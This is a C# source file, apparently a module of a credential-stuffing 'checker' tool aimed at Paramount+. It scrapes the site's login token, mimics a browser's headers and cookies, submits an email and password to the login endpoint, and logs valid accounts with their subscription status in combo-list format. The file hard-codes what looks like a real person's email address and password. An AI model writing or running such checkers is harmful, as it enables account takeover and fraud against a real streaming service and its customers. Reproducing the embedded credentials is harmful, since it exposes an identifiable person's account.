using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Fox.Configs
{
    internal class Paramount
    {
        public static void paramount()
        {
            string email = "cwoywood911@gmail.com";
            string pass = "cwj1395083475";

            using (Leaf.xNet.HttpRequest req = new Leaf.xNet.HttpRequest())
            {
                req.IgnoreProtocolErrors = true;
                string send_data = req.Get("https://www.paramountplus.com/intl/signin/", null).ToString();
                var token = Fox.Fuctions.Parsing.LR(send_data, "CBS.Registry.login.authToken = '", "';");
                string tokenp = String.Join(", ", token);
                Console.WriteLine(tokenp);


                req.AddHeader("accept", "application/json, text/plain, */*");
                req.AddHeader("accept-encoding", "gzip, deflate, br");
                req.AddHeader("accept-language", "hu,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,de;q=0.6");
     
                req.AddHeader("cookie", "OptanonAlertBoxClosed=2022-04-20T10:32:57.884Z; OptanonConsent=isGpcEnabled=0&datestamp=Wed+Apr+20+2022+12%3A32%3A57+GMT%2B0200+(Central+European+Summer+Time)&version=6.30.0&isIABGlobal=false&hosts=&consentId=bb24f193-faa0-441c-8c5f-8993d57c7635&interactionCount=1&landingPath=NotLandingPage&groups=1%3A1%2C2%3A1%2C3%3A1%2C4%3A1%2C5%3A1; irclickid=undefined; s_ecid=MCMID%7C91279673048362348890813357881329163082; AMCVS_10D31225525FF5790A490D4D%40AdobeOrg=1; s_cc=true; utag_main=v_id:0180468848b2000a867cd520d52305086002a07e00bd0$_sn:1$_se:4$_ss:0$_st:1650452584347$ses_id:1650450778292%3Bexp-session$_pn:1%3Bexp-session$vapi_domain:paramountplus.com; prevPageType=login_options; AMCV_10D31225525FF5790A490D4D%40AdobeOrg=359503849%7CMCIDTS%7C19103%7CMCMID%7C91279673048362348890813357881329163082%7CMCAID%7CNONE%7CMCOPTOUT-1650457984s%7CNONE%7CvVersion%7C5.0.1");
                req.AddHeader("origin", "https://www.paramountplus.com");
                req.AddHeader("referer", "https://www.paramountplus.com/intl/signin/");
                req.AddHeader("sec-fetch-site", "same-origin");
                req.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 Edg/100.0.1185.44");
                req.AddHeader("x-requested-with", "XMLHttpRequest");
                string payload = "email=" + email + "&password=" + pass + "&tk_trp=" + tokenp;
               send_data = req.Post("https://www.paramountplus.com/account/xhr/login/", payload, "application/x-www-form-urlencoded").ToString();
                if (send_data.Contains("\"success\":true"))
                {
                    var Sub = Fox.Fuctions.Parsing.LR(send_data, "\"code\":\"", "\",");
                    string suba = String.Join(", ", Sub);

                    var Package = Fox.Fuctions.Parsing.LR(send_data, "\"status\":\"", "\",");
                    string Packagea = String.Join(", ", Package);

                    string capture = " + " + email + ":" + pass + " | Sub = " + suba + " | Packagea = " + Packagea;
                    Console.WriteLine(capture);


                }
                else if (send_data.Contains("\"success\":false") | send_data.Contains("Invalid email and\\/or password") | send_data.Contains("Invalid"))
                {
                    string capture = " - " + email + ":" + pass;
                    Console.WriteLine(capture);
                }
                else if (send_data.Contains("\"plan_type\":null"))
                {
                    string capture = " / " + email + ":" + pass;
                    Console.WriteLine(capture);

                }
              
            }

        }
    }
}
